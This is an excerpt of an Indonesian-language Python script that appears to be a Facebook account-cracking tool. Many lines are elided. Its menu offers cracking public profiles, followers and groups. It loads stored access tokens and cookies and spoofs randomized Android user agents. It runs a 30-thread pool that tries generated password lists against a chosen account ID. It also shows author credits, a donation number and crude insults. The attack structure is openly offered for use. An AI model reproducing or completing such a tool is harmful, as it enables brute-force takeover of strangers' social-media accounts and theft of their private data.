...
for t in range(10000):
	...
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	brayen1=f'Mozilla/5.0 (Linux; Android {a}; SM-A013M Build/QP1A.{b}.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.{d}.0.{e} Mobile Safari/537.36'
	brayen2=f'Mozilla/5.0 (Linux; Android {a}; 2201116SG Build/SKQ1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.{d}.0.{e} Mobile Safari/537.36'
...
\t|_   _ \                                             
\t  | |_) | _ .--.  ,--.   ____   ____  .---.  _ .--.                 
\t  |  __'.[ `/'`\]`'_\ : [_   ] [_   ]/ /__\\[ `/'`\]              {m}•{k}•{h}•{sir} Donate : 081388341152 {x}{m}•{k}•{h}•{x}''')
\t _| |__) || |    // | |, .' /_  .' /_| \__., | |     	
\t|_______/[___]   \'-;__/[_____][_____]'.__.'[___]    	
			{m}•{k}•{h}•{sir} Author : Alvino_Adijaya {x}{m}•{k}•{h}•{x}''')
			{m}•{k}•{h}•{sir} Recode : Febriven_Greyno {x}{m}•{k}•{h}•{x}''')
			{m}•{k}•{h}•{sir} Version Script : Alvino x Greyno Recode {x}{m}•{k}•{h}•{x}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def menu(id):
	...
	cetak(nel('\tSelamat Datang Semoga Betah '))
	print(f'>> Your Idz : {id}')
	print(f'>> Your Ip  : {ip}')
	print('')
	print('>> 1. Crack Publik ')
	print('>> 2. Crack Follower(rusak) ')
	print('>> 3. Crack Grup(rusak)   ')
	print('>> 4. Crack File(rusak)	')
	print('>> 5. Hasil Crack  ')
	print('>> 0. Keluar       ')
	...
	if _____alvino__adijaya_____ in ['1']:
		...
		back()
def error():
	print(f'{k}>> dah dibilangin rusak lu malah teken lagi kontol {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
...
def nge_krek1():
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		a = input('masukkan id fb kalau ingin crack akun sendiri ketik(me) : ')
		try:
			params = {
			"access_token": token, 
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}•{k}•{h}•{x} FG Script {m}•{k}•{h}•{x} <<<<< ')
	print('')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crackmbasic,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] Crack Selesai Telah Selesai Jangan Lupa Bersyukur[cyan] <<[white] '))
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}>>{k} Donate Bro : 081388341152{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METODE-ALPHA ]-----------------#
def crack(idf,pwv):
